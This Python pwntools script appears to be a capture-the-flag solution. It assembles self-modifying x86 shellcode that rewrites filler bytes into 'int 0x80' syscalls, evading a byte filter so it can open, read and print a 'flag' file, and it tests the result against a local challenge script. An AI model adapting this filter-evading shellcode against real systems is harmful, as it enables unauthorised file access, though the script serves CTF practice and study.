#!/usr/bin/env python3
from pwn import *

# Create shellcode that uses syscalls to:
# 1. open("flag", O_RDONLY)
# 2. read(fd, buf, 100)
# 3. write(1, buf, count)

base = 0x1337005

sc = b""

# We need to create multiple "int 0x80" instructions
# Each will be "inc eax; inc eax" (0x40 0x40) modified to 0xcd 0x80

# First syscall location
syscall1_offset = 60
syscall1_addr = base + syscall1_offset

# Modify first syscall bytes
sc += b"\xb8" + p32(syscall1_addr)  # mov eax, syscall1_addr
sc += b"\x80\x00\x8d"                # add byte ptr [eax], 0x8d
sc += b"\x40"                         # inc eax
sc += b"\x80\x00\x40"                 # add byte ptr [eax], 0x40

# Second syscall location
syscall2_offset = 100
syscall2_addr = base + syscall2_offset

# Modify second syscall bytes
sc += b"\xb8" + p32(syscall2_addr)  # mov eax, syscall2_addr
sc += b"\x80\x00\x8d"                # add byte ptr [eax], 0x8d
sc += b"\x40"                         # inc eax
sc += b"\x80\x00\x40"                 # add byte ptr [eax], 0x40

# Third syscall location
syscall3_offset = 140
syscall3_addr = base + syscall3_offset

# Modify third syscall bytes
sc += b"\xb8" + p32(syscall3_addr)  # mov eax, syscall3_addr
sc += b"\x80\x00\x8d"                # add byte ptr [eax], 0x8d
sc += b"\x40"                         # inc eax
sc += b"\x80\x00\x40"                 # add byte ptr [eax], 0x40

# SYSCALL 1: open("flag", O_RDONLY)
# Push "flag" string
sc += b"\x68\x66\x6c\x61\x67"  # push "galf" (little endian: "flag")
sc += b"\x89\xe3"               # mov ebx, esp (filename pointer)
sc += b"\xb8\x05\x00\x00\x00"  # mov eax, 5 (open)
sc += b"\xb9\x00\x00\x00\x00"  # mov ecx, 0 (O_RDONLY)
sc += b"\xba\x00\x00\x00\x00"  # mov edx, 0 (mode)

# Jump to syscall1
curr_len = len(sc)
jmp_dist = syscall1_offset - curr_len - 5
sc += b"\xe9" + p32(jmp_dist & 0xffffffff)

# Pad to syscall1 location
while len(sc) < syscall1_offset:
    sc += b"\x40\x48"  # inc eax, dec eax

# SYSCALL 1: int 0x80 (will be modified from inc eax, inc eax)
sc += b"\x40\x40"

# After open, eax = fd
# SYSCALL 2: read(fd, buf, 100)
sc += b"\x89\xc3"               # mov ebx, eax (fd)
sc += b"\xb8\x03\x00\x00\x00"  # mov eax, 3 (read)
sc += b"\x89\xe1"               # mov ecx, esp (buffer)
sc += b"\xba\x64\x00\x00\x00"  # mov edx, 100 (size)

# Jump to syscall2
curr_len = len(sc)
jmp_dist = syscall2_offset - curr_len - 5
sc += b"\xe9" + p32(jmp_dist & 0xffffffff)

# Pad to syscall2 location
while len(sc) < syscall2_offset:
    sc += b"\x40\x48"

# SYSCALL 2: int 0x80
sc += b"\x40\x40"

# After read, eax = bytes read
# SYSCALL 3: write(1, buf, bytes_read)
sc += b"\x89\xc2"               # mov edx, eax (count from read)
sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (write)
sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1 (stdout)
# ecx already points to buffer

# Jump to syscall3
curr_len = len(sc)
jmp_dist = syscall3_offset - curr_len - 5
sc += b"\xe9" + p32(jmp_dist & 0xffffffff)

# Pad to syscall3 location
while len(sc) < syscall3_offset:
    sc += b"\x40\x48"

# SYSCALL 3: int 0x80
sc += b"\x40\x40"

# Exit cleanly: exit(0)
sc += b"\xb8\x01\x00\x00\x00"  # mov eax, 1 (exit)
sc += b"\xbb\x00\x00\x00\x00"  # mov ebx, 0 (status)
# We'd need another int 0x80 but let's just loop
sc += b"\xeb\xfe"  # jmp $ (infinite loop)

print(f"Shellcode length: {len(sc)}")
print(f"Hex: {sc.hex()}")

# Test validation
print("\nTesting validation...")
result = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1 | head -20').read()
if "bad" in result:
    print("FAILED VALIDATION:")
    print(result)
else:
    print("Passed validation!")
    print("Sample disassembly:")
    print(result)
